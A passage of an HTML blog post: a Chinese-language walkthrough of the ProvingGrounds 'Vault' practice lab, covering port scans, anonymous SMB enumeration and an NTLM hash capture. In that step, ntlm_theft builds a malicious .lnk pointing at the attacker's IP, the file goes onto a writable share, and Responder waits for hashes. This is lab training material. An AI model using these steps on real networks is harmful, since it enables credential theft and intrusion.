@@ -1,0 +1,1122 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>ProvingGrounds Vault Writeup - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
+<meta name="description" content="Vault 这是第23台，Windows系统，难度Hard，名称 Vault
+"><meta name="keywords" content='OSCP, PG_Practice'>
+  <meta itemprop="name" content="ProvingGrounds Vault Writeup">
+  <meta itemprop="description" content="Vault 这是第23台，Windows系统，难度Hard，名称 Vault">
+  <meta itemprop="datePublished" content="2024-02-09T15:31:05+00:00">
+  <meta itemprop="dateModified" content="2024-02-09T15:31:05+00:00">
+  <meta itemprop="wordCount" content="3612">
+  <meta itemprop="keywords" content="OSCP,PG_Practice"><meta property="og:url" content="http://localhost:1313/posts/provinggrounds-vault/">
+  <meta property="og:site_name" content="Xavier&#39;s Blog">
+  <meta property="og:title" content="ProvingGrounds Vault Writeup">
+  <meta property="og:description" content="Vault 这是第23台，Windows系统，难度Hard，名称 Vault">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-02-09T15:31:05+00:00">
+    <meta property="article:modified_time" content="2024-02-09T15:31:05+00:00">
+    <meta property="article:tag" content="OSCP">
+    <meta property="article:tag" content="PG_Practice">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="ProvingGrounds Vault Writeup">
+  <meta name="twitter:description" content="Vault 这是第23台，Windows系统，难度Hard，名称 Vault">
+<meta name="application-name" content="Xavier&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/provinggrounds-vault/" title="ProvingGrounds Vault Writeup - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/provinggrounds-nagoya/" title="ProvingGrounds Nagoya Writeup" /><link rel="next" type="text/html" href="http://localhost:1313/posts/provinggrounds-butch/" title="ProvingGrounds Butch Writeup" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/provinggrounds-vault/index.md" title="ProvingGrounds Vault Writeup - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "ProvingGrounds Vault Writeup",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/provinggrounds-vault\/"
+    },"genre": "posts","keywords": "OSCP, PG_Practice","wordcount":  3612 ,
+    "url": "http:\/\/localhost:1313\/posts\/provinggrounds-vault\/","datePublished": "2024-02-09T15:31:05+00:00","dateModified": "2024-02-09T15:31:05+00:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Xavier"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>ProvingGrounds Vault Writeup</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="post-category" title="分类 - 靶场"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div><div class="post-meta-line"><span title="发布于 2024-02-09 15:31:05"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-02-09">2024-02-09</time></span>&nbsp;<span title="3612 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 3700 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 8 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#vault">Vault</a></li>
+    <li><a href="#portscan">PortScan</a></li>
+    <li><a href="#initaccess">InitAccess</a>
+      <ul>
+        <li><a href="#smb">SMB</a></li>
+      </ul>
+    </li>
+    <li><a href="#prive">PrivE</a>
+      <ul>
+        <li><a href="#serestoreprivilege">SeRestorePrivilege</a></li>
+        <li><a href="#gpo-abuse">GPO Abuse</a></li>
+      </ul>
+    </li>
+    <li><a href="#flag">flag</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="vault" class="heading-element"><span>Vault</span>
+  <a href="#vault" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>这是第23台，Windows系统，难度Hard，名称 Vault</p>
+<p>192.168.202.172</p>
+<h2 id="portscan" class="heading-element"><span>PortScan</span>
+  <a href="#portscan" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -n -r --min-rate<span class="o">=</span><span class="m">3500</span> -sSV 192.168.202.172 -T4   
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-02-09 16:45 CST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.202.172
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.19s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">988</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp   open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2024-02-09 08:45:09Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: vault.offsec0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: vault.offsec0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp open  tcpwrapped
+</span></span><span class="line"><span class="cl">3389/tcp open  ms-wbt-server Microsoft Terminal Services
+</span></span><span class="line"><span class="cl">Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 20.25 seconds</span></span></code></pre></td></tr></table>
+</div>
+</div><p>全端口扫描：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -n -r --min-rate<span class="o">=</span><span class="m">3500</span> -sSV 192.168.202.172 -T4 -p-           
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> xavier 的密码：
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-02-09 16:45 CST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.202.172
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.19s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65514</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2024-02-09 08:46:28Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: vault.offsec0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: vault.offsec0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class="line"><span class="cl">49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">49670/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49671/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49689/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49704/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 115.86 seconds</span></span></code></pre></td></tr></table>
+</div>
+</div><p>域主机，域名：vault.offsec</p>
+<h2 id="initaccess" class="heading-element"><span>InitAccess</span>
+  <a href="#initaccess" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="smb" class="heading-element"><span>SMB</span>
+  <a href="#smb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>SMB匿名访问</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ smbclient -L //192.168.202.172/ -U <span class="s1">&#39;&#39;</span>                       
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\]</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
+</span></span><span class="line"><span class="cl">        ---------       ----      -------
+</span></span><span class="line"><span class="cl">        ADMIN$          Disk      Remote Admin
+</span></span><span class="line"><span class="cl">        C$              Disk      Default share
+</span></span><span class="line"><span class="cl">        DocumentsShare  Disk      
+</span></span><span class="line"><span class="cl">        IPC$            IPC       Remote IPC
+</span></span><span class="line"><span class="cl">        NETLOGON        Disk      Logon server share 
+</span></span><span class="line"><span class="cl">        SYSVOL          Disk      Logon server share 
+</span></span><span class="line"><span class="cl">Reconnecting with SMB1 <span class="k">for</span> workgroup listing.
+</span></span><span class="line"><span class="cl">do_connect: Connection to 192.168.202.172 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Unable to connect with SMB1 -- no workgroup available</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Vault<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ crackmapexec smb 192.168.202.172 -u <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares 
+</span></span><span class="line"><span class="cl">SMB         192.168.202.172 <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:vault.offsec<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         192.168.202.172 <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> vault.offsec<span class="se">\g</span>uest: 
+</span></span><span class="line"><span class="cl">SMB         192.168.202.172 <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         192.168.202.172 <span class="m">445</span>    DC               Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         192.168.202.172 <span class="m">445</span>    DC               -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         192.168.202.172 <span class="m">445</span>    DC               ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         192.168.202.172 <span class="m">445</span>    DC               C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         192.168.202.172 <span class="m">445</span>    DC               DocumentsShare  READ,WRITE      
+</span></span><span class="line"><span class="cl">SMB         192.168.202.172 <span class="m">445</span>    DC               IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         192.168.202.172 <span class="m">445</span>    DC               NETLOGON                        Logon server share 
+</span></span><span class="line"><span class="cl">SMB         192.168.202.172 <span class="m">445</span>    DC               SYSVOL                          Logon server share</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到 DocumentsShare 路径下有可写权限。尝试上传恶意文件到该目录下。</p>
+<p>使用<a href="https://github.com/Greenwolf/ntlm_theft"target="_blank" rel="external nofollow noopener noreferrer">NTLM_Theft</a>工具生成恶意文件.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Hacksafe/4-权限提升/Windows/ntlm_theft<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ python3 ntlm_theft.py -g lnk -s 192.168.45.248 -f <span class="nb">test</span>
+</span></span><span class="line"><span class="cl">Created: test/test.lnk <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Generation Complete.</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上传到该目录下，responder等待回连</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Vault<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ smbclient //192.168.202.172/DocumentsShare -U <span class="s1">&#39;&#39;</span>
